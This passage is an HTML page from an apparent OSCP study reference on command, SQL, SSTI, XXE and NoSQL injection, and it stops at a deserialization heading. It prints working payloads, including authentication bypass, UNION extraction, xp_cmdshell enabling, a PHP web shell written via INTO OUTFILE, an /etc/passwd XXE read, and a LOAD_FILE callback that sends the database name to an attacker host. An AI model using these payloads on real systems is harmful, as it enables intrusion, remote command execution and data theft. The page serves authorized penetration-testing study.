@@ -1,0 +1,240 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Command and Manual SQL Injection — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/reference/03-initial-access/03-command-and-sql-injection/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#operating-system-command-injection">Operating-system command injection</a><ul><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#visible-output-baseline">Visible-output baseline</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#blind-timing-proof">Blind timing proof</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#after-command-execution">After command execution</a></li></ul></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#manual-sql-injection-workflow">Manual SQL injection workflow</a><ul><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#1-establish-query-influence">1. Establish query influence</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#2-authentication-bypass-candidate">2. Authentication-bypass candidate</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#3-determine-union-shape">3. Determine UNION shape</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#4-extract-only-after-fingerprinting-the-dbms">4. Extract only after fingerprinting the DBMS</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#5-boolean--or-time-blind-extraction">5. Boolean- or time-blind extraction</a></li></ul></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#database-control-to-operating-system-effect">Database control to operating-system effect</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#out-of-band-sql-injection-boundary">Out-of-band SQL injection boundary</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#failure-guided-decisions">Failure-guided decisions</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#handoffs">Handoffs</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#ssti--prove-template-evaluation-then-identify-the-engine">SSTI — prove template evaluation, then identify the engine</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#xxe--test-the-xml-parser-and-file-read-result">XXE — test the XML parser and file-read result</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#nosql-operator-injection--separate-json-objects-from-strings">NoSQL operator injection — separate JSON objects from strings</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#php-deserialization--match-the-gadget-to-installed-dependencies">PHP deserialization — match the gadget to installed dependencies</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#unsafe-yaml-construction--distinguish-loading-from-safe-parsing">Unsafe YAML construction — distinguish loading from safe parsing</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#sql-truncation-or-normalization-mismatch-at-registration">SQL truncation or normalization mismatch at registration</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash">Shellshock candidate — only for a CGI path that invokes vulnerable Bash</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/#sources">Sources</a></li></ul></details><ul><li><details open><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details open><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/" aria-current="page">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="command-and-manual-sql-injection">Command and Manual SQL Injection</h1>
+<p><a href="/oscp/reference/03-initial-access/">← Stage index</a> · <a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">Web mapping</a> · <a href="/oscp/cheatsheets/web-exploitation/#command-injection">Quick sheet</a> · <a href="/oscp/notes/Master_Notes/#injection-primitives">Mechanics</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></p>
+<blockquote>
+<p><strong>Use when:</strong> mapped application behavior suggests attacker input reaches an operating-system command or database query. Preserve a valid baseline, change one input at a time and prove each capability separately.</p>
+</blockquote>
+<h2 id="operating-system-command-injection">Operating-system command injection</h2>
+<h3 id="visible-output-baseline">Visible-output baseline</h3>
+<p>Start with a benign identity marker appropriate to the inferred operating system:</p>
+<pre><code class="language-bash">curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH
+curl -skG --data-urlencode 'host=127.0.0.1&#x26;whoami' http://TARGET:PORT/PATH
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution.</p>
+</blockquote>
+<details>
+<summary><strong>Variants — separators, quoting and POST bodies</strong></summary>
+<p>Test only the forms compatible with the observed command and platform:</p>
+<pre><code class="language-text">127.0.0.1; id
+127.0.0.1 &#x26;&#x26; id
+127.0.0.1 | id
+127.0.0.1%0aid
+</code></pre>
+<pre><code class="language-bash">curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH
+curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH
+</code></pre>
+<p>For Windows command contexts, use an observed <code>cmd.exe</code> or PowerShell boundary before choosing syntax:</p>
+<pre><code class="language-text">127.0.0.1 &#x26; whoami
+127.0.0.1 | whoami
+</code></pre>
+</details>
+<h3 id="blind-timing-proof">Blind timing proof</h3>
+<p>Repeat a control and a bounded-delay request several times:</p>
+<pre><code class="language-bash">curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH
+curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH
+</code></pre>
+<p>Windows candidate after platform evidence:</p>
+<pre><code class="language-text">127.0.0.1 &#x26; timeout /t 5
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive.</p>
+</blockquote>
+<h3 id="after-command-execution">After command execution</h3>
+<pre><code class="language-text">Linux:   id; hostname; pwd
+Windows: whoami; hostname; cd
+</code></pre>
+<p>Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell.</p>
+<h2 id="manual-sql-injection-workflow">Manual SQL injection workflow</h2>
+<blockquote>
+<p><strong>Exam boundary:</strong> the current OSCP+ exam guide prohibits SQLmap and other automatic exploitation tools. The following procedure is manual. Recheck the current guide before an exam.</p>
+</blockquote>
+<h3 id="1-establish-query-influence">1. Establish query influence</h3>
+<p>Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition:</p>
+<pre><code class="language-text">VALUE
+VALUE'
+VALUE' AND '1'='1
+VALUE' AND '1'='2
+</code></pre>
+<p>For a numeric context:</p>
+<pre><code class="language-text">1
+1 AND 1=1
+1 AND 1=2
+</code></pre>
+<blockquote>
+<p><strong>Evidence:</strong> a database error, stable true/false response difference, or repeatable database-specific delay. An isolated <code>500</code>, WAF block or generic application error is not enough.</p>
+</blockquote>
+<h3 id="2-authentication-bypass-candidate">2. Authentication-bypass candidate</h3>
+<p>In an authorized disposable lab, preserve the application's quoting and comment syntax:</p>
+<pre><code class="language-text">' OR 1=1-- -
+administrator'-- -
+</code></pre>
+<blockquote>
+<p><strong>Verification:</strong> identify the resulting account/session and perform a separate authorized request. A redirect or welcome string alone can be misleading.</p>
+</blockquote>
+<h3 id="3-determine-union-shape">3. Determine UNION shape</h3>
+<p>First establish column count:</p>
+<pre><code class="language-text">' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+</code></pre>
+<p>Or increment <code>NULL</code> columns until the query succeeds:</p>
+<pre><code class="language-text">' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+</code></pre>
+<p>Then find a displayed text-compatible column:</p>
+<pre><code class="language-text">' UNION SELECT NULL,'MARKER_7F31',NULL-- -
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> the marker appears in a response location controlled by the injected row. Match the exact column count and data types.</p>
+</blockquote>
+<h3 id="4-extract-only-after-fingerprinting-the-dbms">4. Extract only after fingerprinting the DBMS</h3>
+<pre><code class="language-text">MySQL:      ' UNION SELECT NULL,version(),NULL-- -
+PostgreSQL: ' UNION SELECT NULL,version(),NULL-- -
+MSSQL:      ' UNION SELECT NULL,@@version,NULL-- -
+</code></pre>
+<p>Use the confirmed DBMS's catalog and concatenation syntax rather than cycling unrelated payloads. Keep each extraction request reproducible in Repeater.</p>
+<h3 id="5-boolean--or-time-blind-extraction">5. Boolean- or time-blind extraction</h3>
+<p>Choose a stable page marker or content length for true/false comparisons:</p>
+<pre><code class="language-text">' AND SUBSTRING((SELECT version()),1,1)='P'-- -
+' AND SUBSTRING((SELECT version()),1,1)='X'-- -
+</code></pre>
+<p>DBMS-specific time proofs:</p>
+<pre><code class="language-text">MySQL:      ' AND IF(1=1,SLEEP(5),0)-- -
+PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+MSSQL:      '; IF (1=1) WAITFOR DELAY '0:0:5'--
+</code></pre>
+<blockquote>
+<p>Repeat controls. Time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently.</p>
+</blockquote>
+<h2 id="database-control-to-operating-system-effect">Database control to operating-system effect</h2>
+<p>This is a new transition, not an automatic consequence of SQL injection. Verify the DBMS identity, database role, feature state, filesystem permissions and path or egress assumptions first.</p>
+<details>
+<summary><strong>MSSQL — xp_cmdshell when privilege and policy allow</strong></summary>
+<pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+</code></pre>
+<p>Requires sufficient server privilege; enabling it changes server configuration. Prefer a direct proof when it is already enabled. Verify the Windows service identity returned by <code>whoami</code>.</p>
+</details>
+<details>
+<summary><strong>PostgreSQL — COPY PROGRAM when role and version allow</strong></summary>
+<pre><code class="language-sql">DROP TABLE IF EXISTS cmd_output;
+CREATE TABLE cmd_output(line text);
+COPY cmd_output FROM PROGRAM 'id';
+SELECT * FROM cmd_output;
+</code></pre>
+<p>Requires a superuser or a role such as <code>pg_execute_server_program</code>; the command runs under the database service account.</p>
+</details>
+<details>
+<summary><strong>MySQL/MariaDB — file write as a separate primitive</strong></summary>
+<pre><code class="language-sql">SELECT '&#x3C;?php echo shell_exec($_GET["cmd"]); ?>'
+INTO OUTFILE '/CONFIRMED/WEBROOT/check.php';
+</code></pre>
+<p>Requires <code>FILE</code> privilege, a permitted <code>secure_file_priv</code> destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven.</p>
+</details>
+<h2 id="out-of-band-sql-injection-boundary">Out-of-band SQL injection boundary</h2>
+<p>Out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. A callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction.</p>
+<p>Hypothetical MySQL/Windows UNC lookup in an authorized lab:</p>
+<pre><code class="language-sql">SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE()));
+</code></pre>
+<p>Use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. Required conditions include a DBMS/function that performs the lookup, sufficient database/OS permissions, working outbound DNS/SMB/HTTP as applicable and an observable callback. No callback is inconclusive until query execution and outbound reachability are separated. Avoid poisoning/spoofing; the current OSCP+ exam guide prohibits spoofing.</p>
+<h2 id="failure-guided-decisions">Failure-guided decisions</h2>
+<ul>
+<li>quote causes generic error only -> compare true/false and inspect whether the application, proxy or WAF generated it;</li>
+<li><code>UNION</code> always errors -> recheck context, column count, types, parentheses and comment syntax;</li>
+<li>blind pages differ randomly -> find a stable marker or repeat timing controls before continuing;</li>
+<li>command payload is reflected -> no execution proof; compare command-derived output or side effect;</li>
+<li>command executes but callback fails -> keep execution confirmed and diagnose listener, route, payload and egress separately in Block 7;</li>
+<li>database identity lacks the required role/feature -> retain data access and search extracted configuration/credentials rather than assuming OS execution.</li>
+</ul>
+<h2 id="handoffs">Handoffs</h2>
+<ul>
+<li>extracted password/hash/key/token -> Block 5 with source and identity context;</li>
+<li>exact vulnerable product/version or stored procedure requirement -> Block 6;</li>
+<li>verified OS command -> Block 7 session handling;</li>
+<li>file write into web content -> <a href="/oscp/reference/03-initial-access/02-web-file-handling/">web file handling</a>;</li>
+<li>useful application account/role -> remap authenticated behavior in Block 3.</li>
+</ul>
+<h2 id="ssti--prove-template-evaluation-then-identify-the-engine">SSTI — prove template evaluation, then identify the engine</h2>
+<p>Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload:</p>
+<pre><code class="language-bash"># Jinja/Twig-style expression probe
+curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH
+
+# A different delimiter family, only when the first is literal or errors suggest it
+curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH
+
+# Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation
+curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH
+</code></pre>
+<p>Read: changed, repeatable computed output compared with a literal control supports evaluation. <code>49</code> alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression.</p>
+<p>Sources: <a href="https://portswigger.net/web-security/server-side-template-injection">upstream 1</a>.</p>
+<h2 id="xxe--test-the-xml-parser-and-file-read-result">XXE — test the XML parser and file-read result</h2>
+<p>Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint:</p>
+<pre><code class="language-xml">&#x3C;?xml version="1.0"?>
+&#x3C;!DOCTYPE request [&#x3C;!ENTITY probe SYSTEM "file:///etc/passwd">]>
+&#x3C;request>&#x3C;value>&#x26;probe;&#x3C;/value>&#x3C;/request>
+</code></pre>
+<pre><code class="language-bash">curl -i -b cookies.txt -H 'Content-Type: application/xml' \
+  --data-binary @xxe.xml http://TARGET:PORT/PATH
+</code></pre>
+<p>Read: recognizable file content in the parsed field proves read access; echoing the submitted XML does not. Choose a platform-appropriate file; Windows can use <code>file:///C:/Windows/win.ini</code>. DTD rejection or unresolved entities → check the parser's actual configuration, not more traversal depth.</p>
+<p>If the application builds XML around your input and processes XInclude, a separate condition can exist without control over the document's DOCTYPE:</p>
+<pre><code class="language-xml">&#x3C;value xmlns:xi="http://www.w3.org/2001/XInclude">
+  &#x3C;xi:include parse="text" href="file:///etc/passwd"/>
+&#x3C;/value>
+</code></pre>
+<p>A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing.</p>
+<p>Sources: <a href="https://portswigger.net/web-security/xxe">upstream 1</a>.</p>
+<h2 id="nosql-operator-injection--separate-json-objects-from-strings">NoSQL operator injection — separate JSON objects from strings</h2>
+<p>Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type.</p>
+<pre><code class="language-bash"># A known username with an operator-valued password
+curl -i -c cookies.txt -H 'Content-Type: application/json' \
+  --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN
+
+# Distinct context: a form parser that expands bracketed properties
+curl -i -c cookies.txt --data-urlencode 'username=USER' \
+  --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN
+</code></pre>
+<p>Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of <code>$</code> operators can rule out this route. Broader <code>$ne</code> username queries may select an unexpected first account; keep the intended identity explicit.</p>
+<p>Sources: <a href="https://portswigger.net/web-security/nosql-injection">upstream 1</a>.</p>
+<h2 id="php-deserialization--match-the-gadget-to-installed-dependencies">PHP deserialization — match the gadget to installed dependencies</h2>
